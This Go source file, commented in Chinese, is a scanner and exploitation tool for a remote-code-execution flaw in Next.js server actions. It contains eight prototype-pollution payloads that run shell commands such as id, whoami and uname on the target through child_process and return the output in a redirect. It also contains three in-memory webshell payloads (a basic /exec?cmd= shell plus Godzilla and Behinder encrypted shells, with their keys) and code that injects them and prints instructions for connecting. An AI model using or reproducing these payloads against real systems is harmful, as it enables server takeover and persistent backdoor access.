package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

const (
	// POC 1: 基础回显POC - 通过redirect头回显
	echoPOC1 = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo VULN_CHECK_SUCCESS').toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),{digest: 'NEXT_REDIRECT;push;/login?result='+res+';307;'});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`

	// POC 2: 使用id命令的回显POC
	echoPOC2 = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('id').toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),{digest: 'NEXT_REDIRECT;push;/login?a='+res+';307;'});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`

	// POC 3: 使用whoami命令的回显POC
	echoPOC3 = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('whoami').toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),{digest: 'NEXT_REDIRECT;push;/test?user='+res+';307;'});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`

	// POC 4: 使用hostname命令的回显POC
	echoPOC4 = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('hostname').toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),{digest: 'NEXT_REDIRECT;push;/check?host='+res+';307;'});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`

	// POC 5: 通过process.version检测Node.js版本
	echoPOC5 = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.version;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: 'NEXT_REDIRECT;push;/api?v='+res+';307;'});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`

	// POC 6: 检测操作系统类型
	echoPOC6 = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.platform;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: 'NEXT_REDIRECT;push;/os?type='+res+';307;'});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`

	// POC 7: 使用uname -a命令 (Linux/Mac)
	echoPOC7 = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"try{var res=process.mainModule.require('child_process').execSync('uname -a').toString().trim().substring(0,50);}catch(e){var res='WIN';}throw Object.assign(new Error('NEXT_REDIRECT'),{digest: 'NEXT_REDIRECT;push;/sys?info='+encodeURIComponent(res)+';307;'});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`

	// POC 8: 简化版检测POC
	echoPOC8 = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"throw Object.assign(new Error('NEXT_REDIRECT'),{digest: 'NEXT_REDIRECT;push;/vuln?status=CONFIRMED;307;'});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`

	// 基础内存马POC - 简单命令执行
	memoryShellPOC = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"(async()=>{const http=await import('node:http');const url=await import('node:url');const cp=await import('node:child_process');const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args){if(event==='request'){const[req,res]=args;const parsedUrl=url.parse(req.url,true);if(parsedUrl.pathname==='/exec'){const cmd=parsedUrl.query.cmd||'whoami';cp.exec(cmd,(err,stdout,stderr)=>{res.writeHead(200,{'Content-Type':'application/json'});res.end(JSON.stringify({success:!err,stdout,stderr,error:err?err.message:null}));});return true;}}return originalEmit.apply(this,arguments);};})();","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`

	// Godzilla哥斯拉内存马 - AES加密通信，默认密钥pass，密钥key
	godzillaShellPOC = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"(async()=>{const http=await import('node:http');const url=await import('node:url');const crypto=await import('node:crypto');const vm=await import('node:vm');const PASS='pass';const KEY='3c6e0b8a9c15224a';const algorithm='aes-128-ecb';function decrypt(data,key){const decipher=crypto.createDecipheriv(algorithm,Buffer.from(key),null);decipher.setAutoPadding(false);let decrypted=decipher.update(data,'base64','utf8');decrypted+=decipher.final('utf8');return decrypted.replace(/\\0+$/,'');}function encrypt(data,key){const cipher=crypto.createCipheriv(algorithm,Buffer.from(key),null);cipher.setAutoPadding(true);let encrypted=cipher.update(data,'utf8','base64');encrypted+=cipher.final('base64');return encrypted;}const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args){if(event==='request'){const[req,res]=args;const parsedUrl=url.parse(req.url,true);if(req.method==='POST'&&parsedUrl.pathname.includes('/')){let body='';req.on('data',chunk=>{body+=chunk.toString();});req.on('end',()=>{try{const params=new URLSearchParams(body);const pass=params.get(PASS);if(pass){const code=decrypt(pass,KEY);const result=vm.runInThisContext(code);const output=typeof result==='object'?JSON.stringify(result):String(result);res.writeHead(200,{'Content-Type':'text/html'});res.end(encrypt(output,KEY));return;}}catch(e){res.writeHead(200,{'Content-Type':'text/html'});res.end(encrypt('Error: '+e.message,KEY));return;}res.writeHead(404);res.end();});return true;}}return originalEmit.apply(this,arguments);};})();","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`

	// 冰蝎Behinder内存马 - AES加密通信，密钥rebeyond
	behinderShellPOC = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"(async()=>{const http=await import('node:http');const url=await import('node:url');const crypto=await import('node:crypto');const vm=await import('node:vm');const KEY='e45e329feb5d925b';const algorithm='aes-128-cbc';function md5(data){return crypto.createHash('md5').update(data).digest('hex');}function decrypt(data,key,iv){const decipher=crypto.createDecipheriv(algorithm,Buffer.from(key),Buffer.from(iv));let decrypted=decipher.update(data,'base64','utf8');decrypted+=decipher.final('utf8');return decrypted;}function encrypt(data,key){const iv=Buffer.from(key);const cipher=crypto.createCipheriv(algorithm,Buffer.from(key),iv);let encrypted=cipher.update(data,'utf8','base64');encrypted+=cipher.final('base64');return encrypted;}const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args){if(event==='request'){const[req,res]=args;if(req.method==='POST'){let body='';req.on('data',chunk=>{body+=chunk.toString();});req.on('end',()=>{try{const sessionKey=md5('rebeyond').substring(0,16);const iv=sessionKey;const decrypted=decrypt(body,sessionKey,iv);const result=vm.runInThisContext(decrypted);const output=typeof result==='object'?JSON.stringify(result):String(result);const encrypted=encrypt(output,sessionKey);res.writeHead(200,{'Content-Type':'text/html'});res.end(encrypted);return;}catch(e){}originalEmit.call(this,event,...args);});return true;}}return originalEmit.apply(this,arguments);};})();","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`
)

var allEchoPOCs = []string{
	echoPOC1, echoPOC2, echoPOC3, echoPOC4,
	echoPOC5, echoPOC6, echoPOC7, echoPOC8,
}

// 构建multipart表单数据
func buildMultipartPayload(payload string) ([]byte, string, error) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// 添加第一个字段
	if err := writer.WriteField("0", payload); err != nil {
		return nil, "", err
	}

	// 添加第二个字段
	if err := writer.WriteField("1", `"$@0"`); err != nil {
		return nil, "", err
	}

	// 添加第三个字段
	if err := writer.WriteField("2", "[]"); err != nil {
		return nil, "", err
	}

	contentType := writer.FormDataContentType()
	writer.Close()

	return body.Bytes(), contentType, nil
}

// 发送POC请求 - 尝试多个可能的路由端点
func sendPOC(baseURL, payload string) (*http.Response, error) {
	// 定义可能的漏洞端点
	endpoints := []string{
		"/",
		"/_next/rsc",
		"/api",
		"/api/actions",
		"/api/server-actions",
	}

	bodyData, contentType, err := buildMultipartPayload(payload)
	if err != nil {
		return nil, fmt.Errorf("构建payload失败: %v", err)
	}

	// TLS配置
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}

	transport := &http.Transport{
		TLSClientConfig: tlsConfig,
		DialContext: (&net.Dialer{
			Timeout: 10 * time.Second,
		}).DialContext,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// 尝试每个端点
	for _, endpoint := range endpoints {
		targetURL := baseURL + endpoint
		
		req, err := http.NewRequest("POST", targetURL, bytes.NewReader(bodyData))
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
		req.Header.Set("Next-Action", "x")
		req.Header.Set("X-Nextjs-Request-Id", "b5dce965")
		req.Header.Set("Content-Type", contentType)
		req.Header.Set("X-Nextjs-Html-Request-Id", "SSTMXm7OJ_g0Ncx6jpQt9")

		resp, err := client.Do(req)
		if err == nil {
			return resp, nil
		}
	}

	// 如果所有端点都失败，返回第一个端点的错误
	targetURL := baseURL + endpoints[0]
	req, _ := http.NewRequest("POST", targetURL, bytes.NewReader(bodyData))
	req.Header.Set("Content-Type", contentType)
	return client.Do(req)
}

// 检测漏洞
func checkVulnerability(targetURL string, mu *sync.Mutex) VulnerableTarget {
	// 只在非并发模式下打印详细日志
	printLog := mu == nil

	if printLog {
		fmt.Printf("\n[*] 检测目标: %s\n", targetURL)
		fmt.Printf("[*] 使用 %d 个POC进行检测...\n", len(allEchoPOCs))
	} else {
		// 批量模式下在同一行输出当前检测目标
		if mu != nil {
			mu.Lock()
		}
		fmt.Printf("\r[*] 检测目标: %-60s", targetURL)
		if mu != nil {
			mu.Unlock()
		}
	}

	result := VulnerableTarget{
		URL:        targetURL,
		Vulnerable: false,
		Timestamp:  time.Now(),
	}

	// 尝试所有POC
	for i, poc := range allEchoPOCs {
		if printLog {
			log.Printf("[*] 尝试 POC %d/%d...", i+1, len(allEchoPOCs))
		}

		resp, err := sendPOC(targetURL, poc)
		if err != nil {
			if printLog {
				log.Printf("[-] POC %d 请求失败: %v", i+1, err)
			}
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		bodyStr := string(body)
		resp.Body.Close()

		// 检查响应
		if resp.StatusCode == 307 || resp.StatusCode == 308 {
			location := resp.Header.Get("Location")
			if location != "" && (strings.Contains(location, "VULN_CHECK_SUCCESS") ||
				strings.Contains(location, "result=") ||
				strings.Contains(location, "user=") ||
				strings.Contains(location, "host=") ||
				strings.Contains(location, "status=CONFIRMED")) {
				if printLog {
					fmt.Printf("[+] 漏洞存在! (POC %d 检测成功)\n", i+1)
					fmt.Printf("[+] 重定向到: %s\n", location)
				}
				result.Vulnerable = true
				result.POCIndex = i + 1
				result.Message = fmt.Sprintf("重定向检测成功 - %s", location)
				return result
			}
		}

		// 检查响应体
		if strings.Contains(bodyStr, "VULN_CHECK_SUCCESS") || strings.Contains(bodyStr, "NEXT_REDIRECT") {
			if printLog {
				fmt.Printf("[+] 漏洞存在! (POC %d 响应体检测成功)\n", i+1)
			}
			result.Vulnerable = true
			result.POCIndex = i + 1
			result.Message = "响应体检测成功"
			return result
		}

		// 检查错误信息
		if strings.Contains(bodyStr, "$B1337") || strings.Contains(bodyStr, "__proto__") {
			if printLog {
				fmt.Printf("[?] 可能存在漏洞 (POC %d 发现可疑响应, 状态码: %d)\n", i+1, resp.StatusCode)
			}
		}
	}

	if !result.Vulnerable {
		if printLog {
			fmt.Printf("[-] 未检测到漏洞 (已尝试所有POC)\n")
		}
		result.Message = "未检测到漏洞"
	}

	return result
}

// 注入内存马
func injectMemoryShell(targetURL string, shellType string) {
	fmt.Printf("\n[*] 注入内存马到: %s\n", targetURL)

	var payload string
	var accessPath string

	switch shellType {
	case "basic":
		payload = memoryShellPOC
		accessPath = "/exec?cmd=whoami"
		fmt.Println("[*] 内存马类型: 基础命令执行")
		fmt.Println("[*] 访问方式: GET /exec?cmd=<命令>")
	case "godzilla":
		payload = godzillaShellPOC
		accessPath = "/"
		fmt.Println("[*] 内存马类型: Godzilla 哥斯拉")
		fmt.Println("[*] 密码: pass (参数名)")
		fmt.Println("[*] 密钥: 3c6e0b8a9c15224a")
		fmt.Println("[*] 加密: AES-128-ECB")
	case "behinder":
		payload = behinderShellPOC
		accessPath = "/"
		fmt.Println("[*] 内存马类型: Behinder 冰蝎")
		fmt.Println("[*] 密码: rebeyond")
		fmt.Println("[*] 密钥: e45e329feb5d925b (MD5前16位)")
		fmt.Println("[*] 加密: AES-128-CBC")
	default:
		log.Printf("[-] 不支持的内存马类型: %s\n", shellType)
		return
	}

	resp, err := sendPOC(targetURL, payload)
	if err != nil {
		log.Printf("[-] 注入失败: %v\n", err)
		return
	}
	defer resp.Body.Close()

	fmt.Printf("[+] 内存马注入完成\n")
	fmt.Printf("[*] 响应状态码: %d\n", resp.StatusCode)

	if shellType == "basic" {
		fmt.Printf("[+] 访问路径: %s%s\n", targetURL, accessPath)
		fmt.Println("[*] 提示: 使用 /exec?cmd=<命令> 执行命令")

		// 验证内存马是否注入成功
		time.Sleep(2 * time.Second)
		testURL := targetURL + accessPath
		fmt.Printf("\n[*] 验证内存马: %s\n", testURL)

		testResp, err := http.Get(testURL)
		if err != nil {
			log.Printf("[-] 验证请求失败: %v\n", err)
			return
		}
		defer testResp.Body.Close()

		testBody, _ := io.ReadAll(testResp.Body)
		if testResp.StatusCode == 200 && len(testBody) > 0 {
			fmt.Printf("[+] 内存马验证成功!\n")
			fmt.Printf("[+] 响应: %s\n", string(testBody))
		} else {
			fmt.Printf("[-] 内存马验证失败 (状态码: %d)\n", testResp.StatusCode)
		}
	} else {
		fmt.Printf("[+] Webshell地址: %s (任意路径)\n", targetURL)
		fmt.Println("\n[+] 使用说明:")
		if shellType == "godzilla" {
			fmt.Println("  1. 使用Godzilla工具连接")
			fmt.Println("  2. 选择目标类型: NODEJS")
			fmt.Println("  3. 密码参数: pass")
			fmt.Println("  4. 密钥: 3c6e0b8a9c15224a")
		} else if shellType == "behinder" {
			fmt.Println("  1. 使用冰蝎工具连接")
			fmt.Println("  2. 选择目标类型: NODEJS")
			fmt.Println("  3. 连接密码: rebeyond")
		}
		fmt.Println("\n[!] 提示: 内存马已注入，使用对应工具连接即可")
	}
}
